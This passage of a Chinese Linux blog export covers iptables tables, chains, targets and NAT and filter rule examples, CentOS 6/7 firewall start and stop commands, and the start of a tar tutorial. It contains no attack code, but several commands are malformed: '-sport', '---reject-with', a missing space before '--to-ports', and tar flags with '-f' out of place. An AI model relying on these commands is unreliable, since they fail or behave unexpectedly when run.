title="二、原理"></a>二、原理</h2><h3 id="表（Tables）"><a href="#表（Tables）" class="headerlink" title="表（Tables）"></a>表（Tables）</h3><p>解释：相同规则的集合叫做 <strong>表（Tables）</strong><br><strong>​</strong></p><p><strong>iptables</strong>包含 5 张表（tables）：</p><ol><li>raw 用于配置数据包，raw 中的数据包不会被系统跟踪。</li><li>filter 是用于存放所有与防火墙相关操作的默认表。</li><li>nat 用于 <a href="https://en.wikipedia.org/wiki/Network_address_translation">网络地址转换</a>（例如：端口转发）。</li><li>mangle 用于对特定数据包的修改（参考 <a href="https://en.wikipedia.org/wiki/Mangled_packet">损坏数据包</a>）。</li><li>security 用于 <a href="https://wiki.archlinux.org/title/Security#Mandatory_access_control">强制访问控制</a> 网络规则</li></ol><p>大部分情况仅需要使用<strong>filter</strong>和<strong>nat</strong>。<br>​</p><h3 id="链-（Chains）"><a href="#链-（Chains）" class="headerlink" title="链 （Chains）"></a>链 （Chains）</h3><p>表由链组成，链是一些按顺序排列的规则的列表。默认的 filter 表包含 INPUT， OUTPUT 和 FORWARD 3 条内建的链，这 3 条链作用于数据包过滤过程中的不同时间点，如下图所示。nat 表包含 PREROUTING， POSTROUTING 和 OUTPUT 链。<br>使用 <a href="https://man.archlinux.org/man/iptables.8">iptables(8)</a> 查看其他表中内建链的描述。<br>默认情况下，任何链中都没有规则。可以向链中添加自己想用的规则。链的默认规则通常设置为 ACCEPT，如果想确保任何包都不能通过规则集，那么可以重置为 DROP。默认的规则总是在一条链的最后生效，所以在默认规则生效前数据包需要通过所有存在的规则。<br>用户可以加入自己定义的链，从而使规则集更有效并且易于修改。<br>​</p><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627833570108-3b737d12-a591-4451-a30e-c803245e9869.jpeg#clientId=u29e6ff67-2d10-4&amp;from=paste&amp;id=u042970d9&amp;margin=%5Bobject%20Object%5D&amp;originHeight=1100&amp;originWidth=647&amp;originalType=url%E2%88%B6=1&amp;status=done&amp;style=none&amp;taskId=ubaa1e532-3b21-4845-a0bb-d66f7644ebf"></p><h3 id="规则-（Rules）"><a href="#规则-（Rules）" class="headerlink" title="规则 （Rules）"></a>规则 （Rules）</h3><p>根据指定的匹配条件来尝试匹配每个流经此处的报文，匹配成功，则由规则指定的动作来处理。<br>​</p><h4 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h4><ul><li>基本匹配条件</li><li>拓展匹配条件</li></ul><p>​</p><h4 id="处理动作"><a href="#处理动作" class="headerlink" title="处理动作"></a>处理动作</h4><ul><li>ACCEPT：允许数据包通过。</li><li>DROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</li><li>REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</li><li>SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。</li><li>MASQUERADE：是 SNAT 的一种特殊形式，适用于动态的、临时会变的 ip 上。</li><li>DNAT：目标地址转换。</li><li>REDIRECT：在本机做端口映射。</li><li>LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</li><li>RETURN：防停止执行当前链的后续 rules，并返回到调用链中</li></ul><p><img src="https://github.com/javahuang/gitbook/raw/88b98c792e1d597dca5d7b93e4f20d31ea7ad5af/linux/media/021217_0051_6.png#from=url&amp;id=bJrQo&amp;margin=%5Bobject%20Object%5D&amp;originHeight=533&amp;originWidth=1012&amp;originalType=binary%E2%88%B6=1&amp;status=done&amp;style=none"><br>图中可以看到如下</p><ul><li>有哪些类型的表，<strong>黄色的表示表</strong></li><li>有哪些类型的链，<strong>红色的表示链</strong></li><li>链的规则可以存放在哪些表中</li><li>表的规则可以应用到哪些链中</li><li>链中表的执行优先级</li></ul><p>​</p><h2 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a>三、语法</h2><h3 id="iptables-命令的一般格式"><a href="#iptables-命令的一般格式" class="headerlink" title="iptables 命令的一般格式"></a>iptables 命令的一般格式</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables <span class="token punctuation">[</span>-t 表<span class="token punctuation">]</span> -命令 匹配 操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="t-表"><a href="#t-表" class="headerlink" title="-t 表"></a>-t 表</h3><p>表选项用于指定命令应用于哪个 iptables 内置表。<br>​</p><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>命令选项用于指定 iptables 的执行方式，包括插入规则，删除规则和添加规则，如下表所示</p><pre class="line-numbers language-bash"><code class="language-bash">-P  --policy        <span class="token operator">&lt;</span>链名<span class="token operator">></span>  定义默认策略-L  --list          <span class="token operator">&lt;</span>链名<span class="token operator">></span>  查看iptables规则列表-A  --append        <span class="token operator">&lt;</span>链名<span class="token operator">></span>  在规则列表的最后增加1条规则-I  --insert        <span class="token operator">&lt;</span>链名<span class="token operator">></span>  在指定的位置插入1条规则-D  --delete        <span class="token operator">&lt;</span>链名<span class="token operator">></span>  从规则列表中删除1条规则-R  --replace       <span class="token operator">&lt;</span>链名<span class="token operator">></span>  替换规则列表中的某条规则-F  --flush         <span class="token operator">&lt;</span>链名<span class="token operator">></span>  删除表中所有规则-Z  --zero          <span class="token operator">&lt;</span>链名<span class="token operator">></span>  将表中数据包计数器和流量计数器归零-X  --delete-chain  <span class="token operator">&lt;</span>链名<span class="token operator">></span>  删除自定义链-v  --verbose       <span class="token operator">&lt;</span>链名<span class="token operator">></span>  与-L他命令一起使用显示更多更详细的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="匹配规则"><a href="#匹配规则" class="headerlink" title="匹配规则"></a>匹配规则</h3><p>匹配选项指定数据包与规则匹配所具有的特征，包括源地址，目的地址，传输协议和端口号，如下表所示</p><pre class="line-numbers language-bash"><code class="language-bash">-i --in-interface    网络接口名<span class="token operator">></span>     指定数据包从哪个网络接口进入，-o --out-interface   网络接口名<span class="token operator">></span>     指定数据包从哪个网络接口输出-p ---proto          协议类型        指定数据包匹配的协议，如TCP、UDP和ICMP等-s --source          源地址或子网<span class="token operator">></span>   指定数据包匹配的源地址   --sport           源端口号<span class="token operator">></span>       指定数据包匹配的源端口号   --dport           目的端口号<span class="token operator">></span>     指定数据包匹配的目的端口号-m --match           匹配的模块      指定数据包规则所使用的过滤模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h3><p>前面我们说过 iptables 处理动作除了 ACCEPT、REJECT、DROP、REDIRECT 、MASQUERADE 以外，还多出 LOG、ULOG、DNAT、RETURN、TOS、SNAT、MIRROR、QUEUE、TTL、MARK 等。我们只说明其中最常用的动作：</p><ul><li>REJECT 拦阻该数据包，并返回数据包通知对方，可以返回的数据包有几个选择：ICMP port-unreachable、ICMP echo-reply 或是 tcp-reset（这个数据包包会要求对方关闭联机），进行完此处理动作后，将不再比对其它规则，直接中断过滤程序。范例如下：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -A  INPUT -p TCP --dport 22 -j REJECT --reject-with ICMP echo-reply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>DROP 丢弃数据包不予处理，进行完此处理动作后，将不再比对其它规则，直接中断过滤程序。</li><li>REDIRECT 将封包重新导向到另一个端口（PNAT），进行完此处理动作后，将会继续比对其它规则。这个功能可以用来实作透明代理 或用来保护 web 服务器。例如：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT--to-ports 8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MASQUERADE 改写封包来源 IP 为防火墙的 IP，可以指定 port 对应的范围，进行完此处理动作后，直接跳往下一个规则链（mangle:postrouting）。这个功能与 SNAT 略有不同，当进行 IP 伪装时，不需指定要伪装成哪个 IP，IP 会从网卡直接读取，当使用拨接连线时，IP 通常是由 ISP 公司的 DHCP 服务器指派的，这个时候 MASQUERADE 特别有用。范例如下：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -p TCP -j MASQUERADE --to-ports 21000-31000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>LOG 将数据包相关信息纪录在 /var/log 中，详细位置请查阅 /etc/syslog.conf 配置文件，进行完此处理动作后，将会继续比对其它规则。例如：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -p tcp -j LOG --log-prefix <span class="token string">"input packet"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>SNAT 改写封包来源 IP 为某特定 IP 或 IP 范围，可以指定 port 对应的范围，进行完此处理动作后，将直接跳往下一个规则炼（mangle:postrouting）。范例如下：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -p tcp-o eth0 -j SNAT --to-source 192.168.10.15-192.168.10.160:2100-3200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>DNAT 改写数据包包目的地 IP 为某特定 IP 或 IP 范围，可以指定 port 对应的范围，进行完此处理动作后，将会直接跳往下一个规则链（filter:input 或 filter:forward）。范例如下：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp -d 15.45.23.67 --dport 80 -j DNAT --to-destination 192.168.10.1-192.168.10.10:80-100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>MIRROR 镜像数据包，也就是将来源 IP 与目的地 IP 对调后，将数据包返回，进行完此处理动作后，将会中断过滤程序。</li><li>QUEUE 中断过滤程序，将封包放入队列，交给其它程序处理。透过自行开发的处理程序，可以进行其它应用，例如：计算联机费用等。</li><li>RETURN 结束在目前规则链中的过滤程序，返回主规则链继续过滤，如果把自订规则炼看成是一个子程序，那么这个动作，就相当于提早结束子程序并返回到主程序中。</li><li>MARK 将封包标上某个代号，以便提供作为后续过滤的条件判断依据，进行完此处理动作后，将会继续比对其它规则。范例如下：</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t mangle -A PREROUTING -p tcp --dport 22 -j MARK --set-mark 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="其它参数说明"><a href="#其它参数说明" class="headerlink" title="其它参数说明"></a>其它参数说明</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables <span class="token punctuation">[</span>-t表名<span class="token punctuation">]</span>  <span class="token operator">&lt;</span>链名<span class="token operator">></span> <span class="token operator">&lt;</span>动作<span class="token operator">></span>-t table ：指定设置的表：filter nat mangle  不指定默认为filterCOMMAND：定义如何对规则进行管理chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，可以省略CRETIRIA:指定匹配标准-j ACTION :指定如何进行处理COMMAND详解：-P :设置默认策略（设定默认门是关着的还是开着的）     iptables -P INPUT DROP 这就把默认规则给拒绝了-F: FLASH，清空规则链     iptables -t nat -F PREROUTING     iptables -t nat -F 清空nat表的所有规则-Z：清空链   iptables -Z :清空-A：追加，在当前链的最后新增一个规则-I num <span class="token keyword">:</span> 插入，把当前规则插入为第几条     -I 3-R num：Replays替换/修改第几条规则     iptables -R 3 …………-D num：删除，明确指定删除第几条规则     iptables -D INPUT 12-L 查看规则，下面包含子命令：     -n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。     -v：显示详细信息     --line-numbers <span class="token keyword">:</span> 显示规则的行号CRETIRIA 详解：1.通用匹配：源地址目标地址的匹配     -s：指定作为源地址匹配，这里不能指定主机名称，必须是IP，地址可以取反，加一个“<span class="token operator">!</span>”表示除了哪个IP之外     -d：表示匹配目标地址     -p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP）     -i eth0：从这块网卡流入的数据   （流入一般用在INPUT和PREROUTING上）     -o eth0：从这块网卡流出的数据  （流出一般在OUTPUT和POSTROUTING上）2.扩展匹配（隐含扩展：对协议的扩展 和显式扩展（-m））     -p tcp :TCP协议的扩展       --dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口       --sport：指定源端口       --tcp-fiags：TCP的标志位匹配（SYN,ACK，FIN,PSH，RST,URG）（使用相对较少）       --tcpflags syn,ack,fin,rst syn  用于检测三次握手的第一次包，可简写为--syn     -p udp：UDP协议的扩展  （与tcp相似）     -p icmp：icmp数据报文的扩展     -m multiport：表示启用多端口扩展  --dports 21,23,80-j ACTION 详解：     DROP：表示丢弃     REJECT：明示拒绝     ACCEPT：接受     custom_chain：转向一个自定义的链     MASQUERADE：源地址伪装     REDIRECT：重定向：主要用于实现端口重定向     RETURN：返回：在自定义链执行完毕后使用返回，来返回原规则链<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、实例"><a href="#四、实例" class="headerlink" title="四、实例"></a>四、实例</h2><h3 id="启动-停止-重启防火墙"><a href="#启动-停止-重启防火墙" class="headerlink" title="启动/停止/重启防火墙"></a>启动/停止/重启防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables stop<span class="token function">service</span> iptables start<span class="token function">service</span> iptables restartsystemctl stop iptablessystemctl start iptablessystemctl restart iptables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看规则"><a href="#查看规则" class="headerlink" title="查看规则"></a>查看规则</h3><p>列出默认表 filter 所有链上的规则</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>列出 nat 表中所有链上的规则</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -L<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>列出 nat 表中 PREROUTING 链上的规则</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -L PREROUTING<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看防火墙的状态</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L -n -v --line-numbers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="删除一条规则"><a href="#删除一条规则" class="headerlink" title="删除一条规则"></a>删除一条规则</h3><p>将所有 iptables 以序号标记显示</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L INPUT -n --line-numbersiptables -L OUTPUT -n --line-numbersiptables -L OUTPUT -n --line-numbers <span class="token operator">|</span> <span class="token function">less</span>iptables -L OUTPUT -n --line-numbers <span class="token operator">|</span> <span class="token function">grep</span> 202.54.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>删除 INPUT 里序号为 8 的规则</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -D INPUT 8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="允许特定规则"><a href="#允许特定规则" class="headerlink" title="允许特定规则"></a>允许特定规则</h3><p>允许特定端口(TCP 22)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 22 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>允许来自 192.168.0.4 的包</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -s 192.168.0.4 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>允许现有连接或与现有连接关联的包</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="拦截特定流量"><a href="#拦截特定流量" class="headerlink" title="拦截特定流量"></a>拦截特定流量</h3><p>拦截来自特定 IP 地址 11.11.11.11 对本地服务全部流量</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -s 11.11.11.11 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>删除上一条拦截规则</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -D INPUT -s 11.11.11.11 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>封锁特定端口(TCP 445)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -p tcp -sport 445 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>禁止 ICMP (ping)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -p icmp --icmp-type echo-request -j REJECT ---reject-with icmp-host-prohibited<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>禁止从 80 端口发起新的 TCP 连接但允许 80 端口响应 TCP 连接</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A OUTPUT -p tcp --dport 80 -m state --state NEW -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>禁止所有其他包</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -P INPUT DROPiptables -P FORWARD DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="作为网关提供-NAT-服务"><a href="#作为网关提供-NAT-服务" class="headerlink" title="作为网关提供 NAT 服务"></a>作为网关提供 NAT 服务</h3><p>将来自 192.168.2.0/24 子网数据包源地址改写为 192.168.1.1</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -j SNAT --to-source 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>将来自 192.168.2.0/24 子网数据包源地址改写为防火墙地址</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -j MASQUERADE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>将对 192.168.1.1:80 的数据包发送到 192.168.1.11:80</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -d 192.168.1.1/24 --dport 80 -j DNAT --to-destination 192.168.1.11:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>将对本地 80 端口 的数据包重定向到 8080 端口</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="五、固化操作"><a href="#五、固化操作" class="headerlink" title="五、固化操作"></a>五、固化操作</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>iptables 的配置文件： /etc/sysconfig/iptables<br>​</p><h3 id="保存防火墙规则"><a href="#保存防火墙规则" class="headerlink" title="保存防火墙规则"></a>保存防火墙规则</h3><p>iptables-save 是将规则追加到一个文件，主要是配合 iptables-restore 命令</p><pre class="line-numbers language-bash"><code class="language-bash">iptables-save <span class="token operator">></span> /etc/sysconfig/iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="加载防火墙规则"><a href="#加载防火墙规则" class="headerlink" title="加载防火墙规则"></a>加载防火墙规则</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables-restore <span class="token operator">&lt;</span> /root/my.active.firewall.rules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 6/7 关闭开启防火墙</title>
      <link href="/post/3eb4dfc4.html"/>
      <url>/post/3eb4dfc4.html</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS-6-7-关闭开启防火墙"><a href="#CentOS-6-7-关闭开启防火墙" class="headerlink" title="CentOS 6/7 关闭开启防火墙"></a>CentOS 6/7 关闭开启防火墙</h1><h2 id="一、CentOS-6"><a href="#一、CentOS-6" class="headerlink" title="一、CentOS 6"></a>一、CentOS 6</h2><h3 id="查看防火墙"><a href="#查看防火墙" class="headerlink" title="查看防火墙"></a>查看防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="开启防火墙"><a href="#开启防火墙" class="headerlink" title="开启防火墙"></a>开启防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="查询-iptables-是否开机自启动"><a href="#查询-iptables-是否开机自启动" class="headerlink" title="查询 iptables 是否开机自启动"></a>查询 iptables 是否开机自启动</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> --list <span class="token operator">|</span> <span class="token function">grep</span> iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>0:off 1:off 2:on 3:on 4:on 5:on 6:off</p></blockquote><h3 id="永久关闭防火墙"><a href="#永久关闭防火墙" class="headerlink" title="永久关闭防火墙"></a>永久关闭防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> iptables off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="永久开启防火墙"><a href="#永久开启防火墙" class="headerlink" title="永久开启防火墙"></a>永久开启防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> iptables on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、CentOS-7"><a href="#二、CentOS-7" class="headerlink" title="二、CentOS 7"></a>二、CentOS 7</h2><h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl status firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="关闭防火墙-1"><a href="#关闭防火墙-1" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="开启防火墙-1"><a href="#开启防火墙-1" class="headerlink" title="开启防火墙"></a>开启防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl start firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="永久关闭防火墙-1"><a href="#永久关闭防火墙-1" class="headerlink" title="永久关闭防火墙"></a>永久关闭防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="永久开启防火墙-1"><a href="#永久开启防火墙-1" class="headerlink" title="永久开启防火墙"></a>永久开启防火墙</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件系统权限</title>
      <link href="/post/148aa3db.html"/>
      <url>/post/148aa3db.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-文件系统权限-脑图"><a href="#Linux-文件系统权限-脑图" class="headerlink" title="Linux 文件系统权限 - 脑图"></a>Linux 文件系统权限 - 脑图</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627561722226-cb9bb5b3-2729-4209-b781-79b50e1eb495.jpeg#clientId=ua705966b-1dda-4&amp;from=drop&amp;id=u0e6dbe82&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90-%E8%84%91%E5%9B%BE.jpeg&amp;originHeight=3344&amp;originWidth=4472&amp;originalType=binary%E2%88%B6=1&amp;size=1282465&amp;status=done&amp;style=none&amp;taskId=uebd3d789-d5b1-4e47-b08d-7a2756207ac" alt="Linux文件系统权限-脑图.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux压缩解压文件</title>
      <link href="/post/e2f51a6a.html"/>
      <url>/post/e2f51a6a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-压缩解压文件"><a href="#Linux-压缩解压文件" class="headerlink" title="Linux 压缩解压文件"></a>Linux 压缩解压文件</h1><h2 id="一、tar"><a href="#一、tar" class="headerlink" title="一、tar"></a>一、tar</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Linux tar（英文全拼：tape archive ）命令用于备份文件。<br>tar 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件。<br>​</p><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>-A</td><td>新增文件到以存在的备份文件</td></tr><tr><td>-B</td><td>设置区块大小</td></tr><tr><td>-c</td><td>建立新的备份文件</td></tr><tr><td>-C &lt;目录&gt;</td><td>切换工作目录，先进入指定目录再执行压缩/解压缩操作，可用于仅压缩特定目录里的内容或解压缩到特定目录</td></tr><tr><td>-d</td><td>记录文件的差别</td></tr><tr><td>-x</td><td>从归档文件中提取文件</td></tr><tr><td>-t</td><td>列出备份文件的内容</td></tr><tr><td>-z</td><td>通过 gzip 指令压缩/解压缩文件，文件名最好为*.tar.gz</td></tr><tr><td>-Z</td><td>通过 compress 指令处理备份文件</td></tr><tr><td>-f&lt;备份文件&gt;</td><td>指定备份文件</td></tr><tr><td>-v</td><td>显示指令执行过程</td></tr><tr><td>-r</td><td>添加文件到已经压缩的文件</td></tr><tr><td>-u</td><td>添加改变了和现有的文件到已经存在的压缩文件</td></tr><tr><td>-j</td><td>通过 bzip2 指令压缩/解压缩文件，文件名最好为*.tar.bz2</td></tr><tr><td>-v</td><td>显示操作过程</td></tr><tr><td>-l</td><td>文件系统边界设置</td></tr><tr><td>-k</td><td>保留原有文件不覆盖</td></tr><tr><td>-m</td><td>保留文件不被覆盖</td></tr><tr><td>-w</td><td>确认压缩文件的正确性</td></tr><tr><td>-p</td><td>保留原来的文件权限与属性</td></tr><tr><td>-P</td><td>使用文件名的绝对路径，不移除文件名称前的“/”号</td></tr><tr><td>-N &lt;日期格式&gt;</td><td>只将较指定日期更新的文件保存到备份文件里</td></tr><tr><td>– -exclude=&lt;范本样式&gt;</td><td>排除符合范本样式的文件</td></tr><tr><td>– -remove-files</td><td>归档/压缩之后删除源文件</td></tr></tbody></table><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>从存档中提取文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xfv archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：x = 提取，f = 文件，v = 详细</p></blockquote><p>从文件夹和文件创建未压缩的 <strong>tar</strong> 存档：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfv archive.tar file1 file2 file3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：c = 创建</p></blockquote><p>从文件夹和文件创建压缩的 <strong>tar</strong> 存档：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfzv archive.tar file1 file2 file3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：z = 使用 gzip 压缩</p></blockquote><p>显示存档的所有文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tvf archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>在当前目录中创建所有 <strong>.txt</strong> 文件的未压缩存档：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfv archive.tar *.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>从 gzip tar 压缩包 <strong>archive.tar.gz</strong> 中提取文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xvzf archive.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>使用<strong>bzip2</strong>创建一个压缩的<strong>tar</strong>存档文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> cvfj archive.tar.tbz example.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>选项：j = 使用 bzip2 